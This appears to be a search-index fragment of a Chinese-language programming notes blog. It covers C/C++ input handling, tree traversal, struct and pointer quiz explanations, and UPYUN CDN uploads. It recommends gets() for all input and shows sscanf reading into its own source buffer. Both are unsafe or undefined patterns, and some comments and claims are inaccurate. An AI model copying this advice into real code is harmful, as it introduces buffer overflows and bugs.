<p>\u6ce8\u610f\u6307\u9488\u7684\u661f\u53f7\u522b\u5c11\u5199\uff1a\u60f3\u4e00\u6b21\u5199\u4e24\u4e2a\u6307\u9488\uff1f\u4e0d\u80fd\u5199<code>FILE* fp1,fp2;</code>\u800c\u662f\u6bcf\u4e2a\u53d8\u91cf\u524d\u9762\u90fd\u8981\u5e26\u4e0a\u661f\u53f7\uff01\u6b63\u786e\u5199\u6cd5\uff1a<code>FILE *fp1,*fp2; char *s1,*s2;</code></p> </li> </ul>"},{"location":"C/#_1","title":"\u8f93\u5165\u7684\u95ee\u9898","text":"<p>\u5728\u5f00\u53d1\u771f\u5b9e\u7528\u6237\u4f1a\u4f7f\u7528\u7684\u547d\u4ee4\u884c\u7a0b\u5e8f\u65f6\uff0c\u6211\u5efa\u8bae\u6240\u6709\u7684\u8f93\u5165\u5168\u90e8\u4f7f\u7528gets\u5b8c\u6210\uff0c\u7136\u540e\u518d\u7528sscanf\u8bfb\u53d6\u5230\u53d8\u91cf\uff0c\u53ef\u4ee5\u6709\u6548\u9632\u6b62scanf\u5728\u4e00\u884c\u51fa\u9519\u6ce2\u53ca\u5230\u4e0b\u4e00\u884c</p> <p>\u5f53\u7136\u66f4\u5b89\u5168\u7684\u662f <code>fgets(buf,9999,stdin);</code> \u6307\u5b9a\u6700\u591a\u8bfb\u53d6\u591a\u5c11\u4e2a\u5b57\u8282\u907f\u514d\u6808\u6ea2\u51fa\uff0c\u4f46\u8fd9\u79cd\u65b9\u6cd5\u4f1a\u5f97\u5230\\n\u5b57\u7b26</p> <p>\u53e6\u5916\uff0c\u65e0\u8bba\u662fscanf\u8fd8\u662fsscanf\uff0c\u8d4b\u503c\u7ed9int/double\u7b49\u7c7b\u578b\u7684\u53d8\u91cf\u4e00\u5b9a\u8981\u5199&amp;\u7b26\u53f7\uff01</p> <p>\u4ee5\u4e0b\u4ee3\u7801\u6f14\u793a\u8fd9\u79cd\u8f93\u5165\u65b9\u6cd5\uff0c\u5bf9\u8f93\u5165\u7684n\u4e2a\u6570\u8c03\u7528qsort\u6392\u5e8f\uff1b\u8f93\u5165\u683c\u5f0f\uff1a\u7b2c\u4e00\u884c N\u8868\u793a\u6570\u7684\u4e2a\u6570\uff0c\u7b2c\u4e8c\u884c N\u4e2a\u9700\u8981\u6392\u5e8f\u7684\u6570(N&lt;1000)</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\nchar buf[9999];\nint data[1005]; //\u4e0d\u8981\u5728\u5c40\u90e8\u53d8\u91cf\u5b9a\u4e49\u5927\u6570\u7ec4\uff0c\u4f1a\u70b8\u6808\nint cmp(const void* a,const void* b){\nreturn *(int*)a-*(int*)b;\n}\nint main(){\nint N,i;\ngets(buf);\nsscanf(buf,\"%d\",&amp;N);\ngets(buf);\nfor(i=0;i&lt;N;i++) {\nsscanf(buf,\"%d %[^\\n]\",&amp;data[i],buf);\n}\nqsort(data,N,sizeof(int),cmp);\nfor(i=0;i&lt;N-1;i++) printf(\"%d \",data[i]);\nprintf(\"%d\",data[i]);\n}\n</code></pre>"},{"location":"C/#csstreamsprintf","title":"C++\u7528sstream\u4ee3\u66ffsprintf","text":"<pre><code>#include &lt;string&gt;\n#include &lt;sstream&gt;\n#include &lt;iostream&gt; using namespace std;\nint main(){\nstringstream s;\nstring result;\nint i = 1000;\ns &lt;&lt;\"haha \"&lt;&lt; i; getline(s,result); // the whole line rather than just the first word\ncout &lt;&lt; result &lt;&lt; endl; // print \"haha1000\"\ns.clear();\n} </code></pre>"},{"location":"C/#g","title":"\u89e3\u51b3g++\u7701\u7565\u62f7\u8d1d\u6784\u9020\u51fd\u6570\u7684\u95ee\u9898","text":"<p>g++\u4e3a\u4e86\u9632\u6b62\u5728\u51fd\u6570\u8fd4\u56de\u503c\u662f\u5bf9\u8c61\u7684\u65f6\u5019\uff0c\u62f7\u8d1d\u6784\u9020\u88ab\u8c03\u7528\u591a\u6b21\uff0c\u5373\u4f7f\u62f7\u8d1d\u6784\u9020\u51fd\u6570\u6709\u526f\u4f5c\u7528\uff0c\u4e5f\u4f1a\u88ab\u4f18\u5316\u6389\uff08\u76f4\u63a5\u5c31\u4e0d\u8c03\u7528\u62f7\u8d1d\u6784\u9020\u51fd\u6570\u4e86\uff09</p> <p>\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u4ece\u800c\u8bc1\u660e\u6559\u6750\u4e0a\u7684\u6b63\u786e\u6027/\u8bed\u8a00\u7684\u7279\u6027\uff0c\u9700\u8981\u5728\u7f16\u8bd1\uff08\u4e0d\u662f\u94fe\u63a5\uff09\u7684\u65f6\u5019\u52a0\u5165\u4ee5\u4e0b\u5f00\u5173\uff1a</p> <pre><code>-fno-elide-constructors\n</code></pre>"},{"location":"C/#_2","title":"[\u6570\u636e\u7ed3\u6784]\u6811\u7684\u904d\u5386","text":"<p>\u5141\u8bb8\u4e0d\u786e\u5b9a\u4e2a\u5143\u7d20\u7684\u5b50\u8282\u70b9\u4e2a\u6570\uff0c\u8981\u6c42\u7ed9\u51fa\u6240\u6709\u4ece\u6839\u8282\u70b9\u5f00\u59cb\u5230\u53f6\u8282\u70b9\u7684\u8def\u5f84</p> <p>\u6211\u662f\u8fd9\u4e48\u5199\u7684\u904d\u5386\u5faa\u73af\uff08\u4f2a\u4ee3\u7801\uff09\uff0c\u5176\u4e2dp1\u548cp2\u662f\u6307\u5411\u8282\u70b9\u7684\u6307\u9488\uff1a</p> <pre><code>\u8def\u5f84=[\u6839\u8282\u70b9]\nwhile(\u5faa\u73af\u6761\u4ef6):\n    while (p2=p1\u7684\u4e0b\u4e00\u4e2a\u6ca1\u6709\u904d\u5386\u8fc7\u7684\u5b50\u8282\u70b9)\u4e0d\u4e3a\u7a7a:\n        \u628ap2\u52a0\u5165\u8def\u5f84\n        p1=p2\nif p1\u4e3a\u53f6\u8282\u70b9:\n        \u5f97\u5230\u4e86\u4e00\u6761\u4ece\u6839\u8282\u70b9\u5230\u4e00\u4e2a\u53f6\u8282\u70b9\u7684\u8def\u5f84\n    \u8def\u5f84pop\uff0c\u6362\u8a00\u4e4b\uff0c\u5220\u6389\u6700\u540e\u52a0\u5165\u7684\u8282\u70b9\n    p1=p1\u7684\u7236\u8282\u70b9\uff08\u5c31\u662f\u56de\u6eaf\uff09\n</code></pre> <p>\u5176\u4e2d\u5173\u952e\u7684p1\u7684\u4e0b\u4e00\u4e2a\u6ca1\u6709\u904d\u5386\u8fc7\u7684\u5b50\u8282\u70b9\u7684\u5b9e\u73b0\u662f\u8fd9\u6837\u5b50\u7684\uff1a</p> <pre><code>if \u5f53\u524d\u5b69\u5b50\u7684\u4e0b\u6807&gt;=\u5b69\u5b50\u603b\u6570:\n    return NULL\nelse return \u5b50\u8282\u70b9\u6570\u7ec4[\u5f53\u524d\u4e0b\u6807++]\n</code></pre> <p>\u5356\u4e2a\u5173\u5b50\u3002\u3002\u3002\u8bf7\u601d\u8003\u4e00\u4e0b\u5faa\u73af\u6761\u4ef6\u5e94\u8be5\u5199\u5565\uff1f</p>"},{"location":"C/#_3","title":"\u904d\u5386\u7684\u5faa\u73af\u6761\u4ef6","text":"<p>\u4e00\u5f00\u59cb\u6211\u5199\u7684\u662f\uff1a\u201c\u6839\u8282\u70b9\u8fd8\u6709\u672a\u904d\u5386\u8fc7\u7684\u5b50\u8282\u70b9\u201d\uff0c\u4f46\u662f\u8fd9\u4e48\u5199\u5728\u8fd9\u91cc\u5c31\u51fa\u4e86\u95ee\u9898\uff0c\u7531\u4e8e\u6807\u8bb0\u5df2\u7ecf\u904d\u5386\u7684\u5b50\u8282\u70b9\u53d1\u751f\u5728\u771f\u6b63\u904d\u5386\u5b8c\u5b50\u8282\u70b9\u4e4b\u524d\uff08\u6211\u7528\u7684return \u6570\u7ec4[\u4e0b\u6807++]\uff09\uff0c\u5728\u5faa\u73af\u6839\u8282\u70b9\u7684\u6700\u540e\u4e00\u4e2a\u5b50\u8282\u70b9\u7684\u65f6\u5019\u4f1a\u63d0\u524d\u7ed3\u675f\u5faa\u73af\uff0c\u5bfc\u81f4\u6ca1\u80fd\u904d\u5386\u6240\u6709\u8282\u70b9\uff01</p> <p>\u6b63\u786e\u7684\u5199\u6cd5\u662f\uff1a\u8def\u5f84\u7684\u5143\u7d20\u4e2a\u6570&gt;=1</p> <p>\u8def\u5f84\u53ef\u4ee5\u7528vector\u5b9e\u73b0\uff0c\u5143\u7d20\u4e2a\u6570\u5c31\u662fvector\u7684size()\uff0c\u53ea\u6709\u904d\u5386\u5b8c\u6210\u4e86\u6574\u4e2a\u6811\u4e4b\u540e\uff0c\u6839\u8282\u70b9\u624d\u4f1a\u88abpop\u51fa\u6765\uff0c\u7ed3\u675f\u5faa\u73af\u3002</p>"},{"location":"C/#_4","title":"\u4f7f\u7528\u9762\u5411\u5bf9\u8c61\u7684\u601d\u60f3","text":"<p>\u8fd9\u4e2a\u9898\u76ee\u6211\u4f7f\u7528\u4e86C++\u6765\u5199\uff0c\u679c\u7136\u6bd4C\u597d\u591a\u4e86\u3002\u3002\u3002\u53ea\u8981\u60f3\u597d\u63a5\u53e3\u5c31\u80fd\u5f88\u65b9\u4fbf\u5730\u5b9e\u73b0\u9700\u8981\u7684\u529f\u80fd\u5566\uff08\u4e0d\u8fc7\u8fd8\u662fPython\u5185\u7f6e\u7684list\u597d\u591a\u4e86\uff0cC++\u7684vector\u5404\u79cdconst\u7684\u5751</p> <p>\u8fd9\u91cc\u5206\u4eab\u4e00\u4e0b\u6211\u8bbe\u8ba1\u7684\u63a5\u53e3\uff1a</p> <pre><code>class Node{\npublic:\nNode();\nvoid setChildNum(int num); //\u4e3a\u5b50\u8282\u70b9\u7684\u6307\u9488\u7684\u6570\u7ec4\u5206\u914d\u7a7a\u95f4\nvoid addOneChild(Node* child);\nvoid setData(int data);\nint getData();\nvoid setParent(Node* parent);\nNode* getParent();\nNode* getCurrentChild(); //\u83b7\u5f97\u5f53\u524d\u8fd8\u6ca1\u8d70\u8fc7\u7684\u5b50\u8282\u70b9\uff0c\u5e76\u4e14\u628a\u8fd4\u56de\u7684\u5b50\u8282\u70b9\u6807\u8bb0\u4e3a\u8d70\u8fc7\u4e86\nbool hasChildToGo(); //\u8fd9\u4e2a\u8282\u70b9\u662f\u4e0d\u662f\u6240\u6709\u7684\u5b50\u8282\u70b9\u90fd\u5b8c\u6210\u4e86\nbool isLeafNode(); //\u8fd9\u4e2a\u8282\u70b9\u662f\u4e0d\u662f\u53f6\u8282\u70b9\nprivate:\n//...\u7701\u7565\u54af...\n};\nclass Nodes{ //\u5b58\u50a8\u8def\u5f84\u7684Nodes\npublic:\nvoid append(Node* x); //\u628a\u8282\u70b9\u52a0\u5165\u8def\u5f84\nvoid pop(); //\u5220\u6389\u6700\u540e\u52a0\u5165\u7684\u90a3\u4e2a\u8282\u70b9\nint getSumData(); //\u8def\u5f84\u4e0a\u6240\u6709\u8282\u70b9\u7684data\u7684\u548c\nint length(); //\u8def\u5f84\u5f53\u524d\u7684\u957f\u5ea6\nfriend bool cmp(const Nodes&amp; a,const Nodes&amp;b); //\u7528\u4e8e\u5bf9\u8def\u5f84\u8fdb\u884c\u6392\u5e8f\nfriend ostream&amp; operator&lt;&lt;(ostream&amp; out,Nodes&amp; x); private:\nvector&lt;Node*&gt; data;\n};\n</code></pre>"},{"location":"C/#constvectorconst_iterator","title":"\u5bf9\u4e00\u4e2aconst\u7684vector\u4f7f\u7528\u8fed\u4ee3\u5668\u8981\u7528const_iterator","text":"<p>\u6709\u65f6\u5019\u51fd\u6570\u53c2\u6570\u5c31\u89c4\u5b9a\u4e86\u5fc5\u987b\u662fconst\u7684\uff0c\u5982sort\u7684\u6bd4\u8f83\u51fd\u6570\uff0c\u800c\u6bd4\u8f83\u7684\u5bf9\u8c61\u53c8\u662fvector</p> <p>\u65b9\u6cd5\u5c31\u662f\u7528<code>vector&lt;\u4f60\u7684\u7c7b\u578b&gt;::const_iterator</code></p>"},{"location":"C/#_5","title":"\u5c0f\u5fc3\u672a\u521d\u59cb\u5316\u7684\u53d8\u91cf","text":"<p>\u5199\u4ee3\u7801\u7684\u65f6\u5019\u6700\u597d\u58f0\u660e\u7684\u65f6\u5019\u5c31\u7acb\u523b\u521d\u59cb\u5316\uff0c\u672a\u521d\u59cb\u5316\u7684\u53d8\u91cf\u662f\u672a\u5b9a\u4e49\u884c\u4e3a\uff0c\u53ef\u80fd\u51fa\u73b0\u52a0\u4e86\u4e2aprintf\u5c31\u597d\u4e86\uff0c\u53bb\u6389printf\u5c31\u70b8\u4e86\u7684\u60c5\u51b5\u3002</p> <p>\u4f60\u53ef\u4ee5\u5728Linux\u4e0a\u4f7f\u7528<code>gcc -fsanitize=undefined</code>\u7f16\u8bd1\uff0c\u8ba9Undefined Sanitizer\u4e3a\u4f60\u627e\u51fa\u9519\u8bef\uff1b\u987a\u5e26\u4e00\u63d0\uff0cASAN\u4e5f\u5f88\u6709\u7528\uff0c\u53c2\u89c1</p>"},{"location":"C/#_6","title":"\u83b7\u53d6\u6587\u4ef6\u5927\u5c0f","text":"<p>Python\u91cc\u5f88\u7b80\u5355 \u4f60\u53ef\u4ee5os.path.getsize(filename) \u8fd9\u4e2a\u672c\u8d28\u4e0a\u8c03\u7528\u7684\u662fos.stat\uff1b\u4e0b\u9762\u7684\u65b9\u6cd5\u662f\u6253\u5f00\u6587\u4ef6\uff0c\u7528fseek\u8df3\u8f6c\u5230\u6587\u4ef6\u7ed3\u675f</p> <p>Learned from: http://blog.csdn.net/chenglibin1988/article/details/8750480</p> <pre><code>long int get_file_size(char* filename){\n    /*\n     * \u4f7f\u7528fseek\u548cftell\u83b7\u53d6\u6587\u4ef6\u5927\u5c0f\uff0c\u5931\u8d25\u65f6\u8fd4\u56de-1 \n     */\n    int filesize;\n    FILE* fp = fopen(filename,\"rb\");\n    if( NULL == fp ) return -1;\n    fseek(fp,0,SEEK_END);\n    filesize = ftell(fp);\n    fclose(fp);\n    return filesize;\n}\n</code></pre>"},{"location":"C/#c_1","title":"C\u7a0b\u4e60\u9898\u89e3\u7b54","text":"<p>\u5b66\u4e60\u4e00\u4e0b\u5404\u79cd\u5751\u7239\u7684\u9898\u76ee\u4e5f\u662f\u5f88\u4e0d\u9519\u7684\u561b\uff08\u5176\u5b9e\u6211\u5c31\u662f\u4e3a\u4e86\u628a\u6211\u7684\u89e3\u6790\u53d1\u4e0a\u6765\u3002\u3002\u3002</p>"},{"location":"C/#1","title":"1.\u7ed3\u6784\u6307\u9488","text":""},{"location":"C/#_7","title":"\u9898\u76ee","text":"<pre><code>\u5bf9\u4e8e\u4ee5\u4e0b\u7ed3\u6784\u5b9a\u4e49\uff0cp-&gt;str++\u4e2d\u7684++\u52a0\u5728____\u3002\nstruct {int len; char *str}*p;\nA.\u6307\u9488str\u4e0a     B.\u6307\u9488p\u4e0a    C.str\u6307\u5411\u7684\u5185\u5bb9\u4e0a   D.\u8bed\u6cd5\u9519\u8bef\n</code></pre>"},{"location":"C/#_8","title":"\u7b54\u6848","text":"<p>D</p>"},{"location":"C/#_9","title":"\u4e00\u53e5\u8bdd\u89e3\u91ca","text":"<p>\u4f60\u518d\u4ed4\u7ec6\u770b\u770b\uff1f\u662f\u4e0d\u662f\u5c11\u4e86\u4e2a\u5206\u53f7\uff1f</p>"},{"location":"C/#_10","title":"\u8be6\u7ec6\u89e3\u91ca","text":"<p>\u8fd9\u4e2a\u9898\u76ee\u8fd9\u4e48\u5199\u7f16\u8bd1\u5b58\u5728\u8bed\u6cd5\u95ee\u9898\u7684\uff0c\u800c\u4e14\u8fd0\u884c\u4e5f\u4f1a\u70b8</p> <p>\u4f60\u8bd5\u8bd5\u590d\u5236\u5230Dev C++\u7f16\u8bd1\u770b\u770b\uff1f</p> <pre><code>[Error] expected ';' at end of member declaration\n</code></pre> <p>\u8fd9\u4e2a\u9519\u8bef\u5f88\u663e\u7136\u7684\u561b\uff0c\u7f3a\u5c11\u4e86\u5206\u53f7\uff0c\u6b63\u786e\u5199\u6cd5\uff1a</p> <pre><code>struct {int len; char *str;} *p;\n</code></pre>"},{"location":"C/#_11","title":"\u8fd9\u5c31\u591f\u4e86\u5417\uff1f","text":"<p>p\u662f\u4e00\u4e2a\u6307\u9488\uff0c\u5bf9\u6307\u9488\u4f7f\u7528-&gt;\u8fd0\u7b97\u7b26\u4e4b\u524d\u5fc5\u987b\u8981\u7ed9\u6307\u9488\u4e00\u4e2a\u7a7a\u95f4(\u6b63\u786e\u7684\u503c)\uff0c\u5426\u5219\u5c31\u4f1a\u5bfc\u81f4*null\u800c\u6bb5\u9519\u8bef\u70b8\u6389</p> <p>\u53e6\u5916 \u8fd9\u4e2astruct\u6ca1\u6709\u540d\u5b57\uff0c\u4e5f\u5c31\u610f\u5473\u7740\u65e0\u6cd5\u7ed9\u4ed6\u8d4b\u503c\uff0c\u4e0d\u80fd\u88ab\u8d4b\u503c\u7684\u6307\u9488\u6709\u4ec0\u4e48\u7528\u5462\uff1f</p> <p>\u6b63\u786e\u7684\u5199\u6cd5\u5982\u4e0b\uff1a</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\nint main(){\nchar string[666]=\"abcd\"; //\u51c6\u5907\u4e00\u4e2a\u5b57\u7b26\u4e32\nstruct name {int len; char *str;} s;//\u9996\u5148\u8981\u7ed9struct\u53d6\u4e00\u4e2a\u540d\u5b57name\uff0c\u987a\u5e26\u7528\u8fd9\u4e2a\u540d\u5b57\u521b\u5efa\u4e00\u4e2a\u5b9e\u4f8bs\ns.str = string; //\u5bf9\u8fd9\u4e2a\u5b9e\u4f8b\u7684str\u8d4b\u503c\u4e3astring\u7684\u5730\u5740\nstruct name *p = &amp;s; //\u7136\u540e\u662f\u7528struct name\u6765\u521b\u5efa\u4e00\u4e2a\u6307\u5411\u7ed3\u6784\u7684\u6307\u9488p\np-&gt;str++;//\u76f8\u5f53\u4e8es\u7684str++\u4e86\uff0cstr\u539f\u6765\u6307\u5411\"abcd\"\u5b57\u7b26\u4e32\u7684'a'\uff0c\u73b0\u5728\u6307\u5411'b'\nputs(p-&gt;str);//\u8f93\u51fabcd\n}\n</code></pre>"},{"location":"C/#_12","title":"\u56de\u987e\u4e00\u4e0b","text":"<ol> <li> <p>struct\u5fc5\u987b\u8981\u6709\u4e00\u4e2a\u540d\u5b57</p> </li> <li> <p>struct\u5927\u62ec\u53f7\u4e2d\u7684\u6bcf\u4e00\u9879\u90fd\u5fc5\u987b\u4ee5\u5206\u53f7\u7ed3\u5c3e</p> </li> <li> <p>\u4f7f\u7528\u6307\u9488\u53d6\u503c \u5982<code>*p</code> , <code>p-&gt;something</code>\u4e4b\u524d\u6307\u9488\u7684\u503c\u5fc5\u987b\u8bbe\u7f6e\u597d</p> </li> <li> <p>\u9047\u5230\u4e0d\u4f1a\u7684\u9898\u76ee\uff0c\u4e3a\u5565\u4e0d\u81ea\u5df1\u95ee\u95ee\u7f16\u8bd1\u5668\u5462\uff1f</p> </li> </ol>"},{"location":"C/#2","title":"2.\u7ed3\u6784\u6570\u7ec4","text":""},{"location":"C/#_13","title":"\u9898\u76ee","text":"<pre><code>\u5bf9\u4e8e\u4ee5\u4e0b\u7684\u53d8\u91cf\u5b9a\u4e49\uff0c\u8868\u8fbe\u5f0f____\u662f\u6b63\u786e\u7684\u3002\nstruct node {\nchar s[10];\nint k;\n} p[4];\nA. p-&gt;k=2\nB. p[0].s=\"abc\";\nC. p[0]-&gt;k=2;\nD. p-&gt;s='a';\n</code></pre>"},{"location":"C/#_14","title":"\u7b54\u6848","text":"<p>A</p>"},{"location":"C/#_15","title":"\u89e3\u6790","text":"<p><code>p[0].num</code> \u4e0e <code>(*(p+0)).num</code> \u7b49\u4ef7, \u6240\u4ee5 <code>p[0].num</code> \u4e0e <code>(p+0)-&gt;num</code> \u7b49\u4ef7</p> <p>\u7f16\u8bd1\u4e00\u4e0b\u786e\u5b9eA\u662f\u53ef\u4ee5\u7684</p> <p>B\u9009\u9879\u9519\u5728\u7ed3\u6784\u4f53\u91cc\u9762\u7684s\u662f\u4e00\u4e2a\u6709\u5185\u5b58\u7a7a\u95f4\u7684char\u6570\u7ec4\uff0c\u4e0d\u80fd\u628a\u6709\u5185\u5b58\u7a7a\u95f4\u7684\u6570\u7ec4\u540d\u79f0\u653e\u5230\u8d4b\u503c\u7684\u7b49\u53f7\u5de6\u8fb9 (\u7f16\u8bd1\u5668\u628a\u6570\u7ec4\u540d\u79f0\u5f53\u6210\u5e38\u91cf\uff0c\u7f16\u8bd1\u5668\u8fd9\u4e48\u8bbe\u8ba1\u7684\u539f\u56e0\u4e5f\u8bb8\u662f\uff1a\u4e0d\u7136\u8fd9\u4e2a\u5185\u5b58\u7a7a\u95f4\u4e0d\u5c31\u5f04\u4e22\u4e86\u561b)</p> <p>\u5b57\u7b26\u4e32\u6b63\u786e\u7684\u201d\u8d4b\u503c\u201d\u64cd\u4f5c\u662f\uff1a </p> <pre><code>strcpy(p[0].s,\"abc\");\n</code></pre> <p>C\u9009\u9879 p[0]\u662f\u7ed3\u6784\uff0c\u800c\u4e0d\u662f\u6307\u9488\uff0c\u76f4\u63a5\u5199<code>p[0].k=2</code></p> <p>D\u9009\u9879 \u8fd8\u662f\u76f8\u540c\u7684\u9053\u7406 \u4e0d\u80fd\u628a\u6709\u5185\u5b58\u7a7a\u95f4\u7684\u6570\u7ec4\u540d\u79f0\u653e\u5230\u8d4b\u503c\u7684\u7b49\u53f7\u5de6\u8fb9</p> <p>\u6b63\u786e\u7684\u5199\u6cd5 <code>p-&gt;s[0]='a'</code>, \u4e5f\u53ef\u4ee5\u5199 <code>p[0].s[0]='a'</code></p>"},{"location":"C/#_16","title":"\u6307\u9488\uff0c\u6570\u7ec4\u5404\u79cd\u73a9\u6cd5","text":"<p>\u5982\u679c\u8981\u5199<code>p[1].s[2]='a'</code>, \u7b49\u4ef7\u7684\u5199\u6cd5\u6709\uff1a</p> <pre><code>(p+1)-&gt;s[2]='a';\n*((p+1)-&gt;s + 2)='a';\n*((char*)p+1*sizeof(struct node)+2)='a';\n</code></pre> <p>\u6b64\u4ee3\u7801\u4f9b\u4f60\u6d4b\u8bd5\uff1a</p> <pre><code>#include &lt;stdio.h&gt;\nint main(){\nstruct node{\nchar s[10];\nint k;\n} p[4];\np[1].s[2]='a';\nprintf(\"%c\\n\",p[1].s[2]);\n(p+1)-&gt;s[2]='b';\nprintf(\"%c\\n\",p[1].s[2]);\n*((p+1)-&gt;s + 2)='c';\nprintf(\"%c\\n\",p[1].s[2]);\n*((char*)p+1*sizeof(struct node)+2)='d';\nprintf(\"%c\",p[1].s[2]);\nreturn 0;\n}\n</code></pre>"},{"location":"C/#_17","title":"\u6570\u7ec4\u7684\u6570\u7ec4","text":"<p>\u9898\u76ee\uff1a</p> <pre><code> \u4ee5\u4e0b\u7a0b\u5e8f\u7684\u8f93\u51fa\u7ed3\u679c\u662f_________________\u3002\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\ntypedef char (*AP)[5];\nAP defy(char *p)\n{\nint i;\nfor(i=0; i&lt;3; i++)\np[strlen(p)] = 'A';\nreturn (AP)p + 1;\n}\nvoid main()\n{\nchar a[]=\"FROG\\0SEAL\\0LION\\0LAMB\";\nputs( defy(a)[1]+2 );\n}\n</code></pre> <p>\u89e3\u7b54\uff1a</p> <p>\u641e\u6e05\u695a\u6307\u9488\u7684\u7c7b\u578b\u8fd9\u4e2a\u9898\u76ee\u5c31\u5f88\u7b80\u5355\u4e86\uff0c\u53e6\u5916\u8bb0\u4f4f\u8fd9\u4e2a\u516c\u5f0f\uff1a</p> <pre><code>x[i] = *(x+i)\n</code></pre> <p>p[strlen(p)] = \u2018A\u2019; \u5c31\u662f\u628a\\0\u7684\u5730\u65b9\u6539\u6210\u4e86\u5b57\u7b26A</p> <p>\u6240\u4ee5\u6211\u4eec\u7684a\u662f\u8fd9\u6837\u5b50\u7684\uff1a</p> <p>\u4ece\u4e00\u7ef4\u6570\u7ec4\u6765\u770ba\u662f FROGASEALALIONALAMB</p> <p>\u4ece5\u5b57\u8282char\u7684\u6570\u7ec4\u7684\u6570\u7ec4\u6765\u770b\u662f </p> <pre><code>    \"FROGA\", //\u867d\u7136\u8fd9\u91cc\u5199\u7684\u662f\u5b57\u7b26\u4e32\uff0c\u4f46\u672b\u5c3e\u6ca1\u6709\\0\n    \"SEALA\",\n    \"LIONA\",\n    \"LAMB\\0\"\n</code></pre> <p>defy(a)[1]\u5c31\u7b49\u4ef7\u4e8e<code>*(defy(a) +1)</code>\uff0c\u5c31\u662f<code>*( ((AP)a)+1 +1)</code>\uff0c\u5c31\u662f((AP)a)[2]</p> <p>AP\u8fd9\u4e2a\u7c7b\u578b\u662f\u6307\u9488\uff0c\u6307\u5411\u7684\u5143\u7d20\u662f 5\u5b57\u8282\u5927\u5c0f\u7684\u6570\u7ec4\uff0c</p> <p>\u6240\u4ee5((AP)a)[2]\u7684\u7c7b\u578b\u662f<code>char*</code>\uff0c\u6307\u5411\u7684\u662f\u201dLIONA\u201d\u8fd9\u4e2a\u5143\u7d20</p> <p>\u4f46\u662f\u5f53\u6211\u4eec\u628a\u8fd9\u4e2a\u5143\u7d20\u5f53\u6210<code>char*</code>\u7528puts\u8f93\u51fa\u7684\u65f6\u5019\uff0c\u7531\u4e8e\u672b\u5c3e\u6ca1\u6709<code>\\0</code>\uff0c\u6240\u4ee5\u8981\u7ee7\u7eed\u8f93\u51fa\uff0c\u5c31\u662f\u201dLIONALAMB\u201d</p> <p>\u518d+2\u5c31\u662f\u8981\u8df3\u8fc7\u4e24\u4e2a\u5b57\u8282\uff0c\u5f97\u5230\u7b54\u6848\u201dONALAMB\u201d</p> <p>\u4e3e\u4e00\u53cd\u4e09\uff1a</p> <ol> <li>puts(((AP)a)[0])\u8f93\u51fa\u5565\uff1f\u5047\u8bbe\u6ca1\u6709\u8c03\u7528defy(a)</li> <li>puts(((AP)a)[0])\u8f93\u51fa\u5565\uff1f\u5047\u8bbe\u5df2\u7ecf\u505a\u4e86defy(a)</li> <li>puts(((AP)a)[0]+3)\u8f93\u51fa\u5565\uff1f\u5047\u8bbe\u5df2\u7ecf\u505a\u4e86defy(a)</li> <li>defy(a)[2][1]+1\u662f\u4ec0\u4e48\u7c7b\u578b\uff1f\u503c\u662f\u591a\u5c11\uff1f</li> <li>puts(&amp;defy(a)[2][1])\u8f93\u51fa\u5565\uff1f</li> <li>defy(a)\u4e4b\u540e\u518dputs(&amp;defy(a)[2][1])\u8f93\u51fa\u5565\uff1f</li> </ol> <p>\u7b54\u6848\uff1a</p> <ol> <li>FROG</li> <li>FROGASEALALIONALAMB</li> <li>GASEALALIONALAMB</li> <li>char\u7c7b\u578b \u2018B\u2019 \u8fd9\u4e2a\u662fchar\u7684\u2019A\u2019\u518d\u52a0\u4e00</li> <li>AMB</li> <li>\u53d1\u751f\u4e86\u6570\u7ec4\u8d8a\u754c\u8bfb\u5199\uff0c\u8fd9\u662fundefined behaviour</li> </ol>"},{"location":"CDN/","title":"CDN","text":""},{"location":"CDN/#upyun","title":"UPYUN","text":""},{"location":"CDN/#_1","title":"\u4e0a\u4f20\u6587\u4ef6\u7684\u65b9\u6cd5","text":""},{"location":"CDN/#ftp","title":"FTP","text":"<p>\u4eba\u5bb6\u652f\u6301\u7528ftp\u4f20\u8f93\u6587\u4ef6\uff0c\u800c\u4e14\u7528ftp\u4f3c\u4e4e\u4e0d\u5bf9\u6d41\u91cf\u8ba1\u8d39</p> <p>ftp://v0.ftp.upyun.com </p> <p>\u7528\u6237\u540d\u662f\u201d\u64cd\u4f5c\u5458\u540d/\u670d\u52a1\u540d\u201d\uff08\u5176\u4e2d/\u5b57\u7b26\u662f\u7528\u6237\u540d\u7684\u4e00\u90e8\u5206\uff09,\u5bc6\u7801\u4e3a\u201d\u64cd\u4f5c\u5458\u5bc6\u7801\u201d</p> <p>\u6709\u4e9b\u65f6\u5019\u4f60\u9700\u8981\u5bf9\u5176\u4e2d\u7684/\u8fdb\u884curlencode\uff0c\u9700\u8981\u7528<code>%2F</code> \uff08\u4f60\u53ef\u4ee5\u4f7f\u7528Python\u7684<code>quote(\"/\", \"\")</code>\u6765\u67e5\u8be2\uff09</p>"},{"location":"CDN/#curlftpfs","title":"curlftpfs","text":"<p>\u57fa\u4e8e\u4e0a\u8ff0\u7684ftp\uff0c\u5728\u8fd9\u79cd\u60c5\u5883\u4e0b\u53ef\u9760\u6027\u4e0d\u9ad8\uff0c\u4e0d\u5efa\u8bae\u4f7f\u7528</p> <p>http://curlftpfs.sourceforge.net/</p> <p>\u6ce8\u610f\u547d\u4ee4\u4e2d\u7684 ftp://\u7528\u6237\u540d:\u5bc6\u7801@v0.ftp.upyun.com \u5176\u4e2d\u7684\u7528\u6237\u540d\u7684/\u7b26\u53f7\u9700\u8981\u6539\u4e3a%2f</p>"},{"location":"CDN/#upyunmanager","title":"UpyunManager","text":"<p>https://github.com/layerssss/manager-for-upyun</p>"},{"location":"CDN/#upyun-python","title":"UPYUN Python\u6267\u884c\u7f13\u5b58\u5237\u65b0","text":"<p>\u6bd4\u5982\u672cblog\u8bbe\u7f6e\u4e86\u7f13\u5b58\u6240\u6709html\u4e00\u5e74\u6765\u51cf\u5c11\u56de\u6e90github\u7684\u6b21\u6570\uff0c\u5728\u6bcf\u6b21\u6211\u66f4\u65b0\u540e\u5c31\u5237\u65b0\u4e00\u6b21\u7f13\u5b58</p> <p>\u89c4\u5219\u5237\u65b0\uff1a</p> <p>https://github.com/zjuchenyuan/EasyLogin/tree/master/examples/upyun</p> 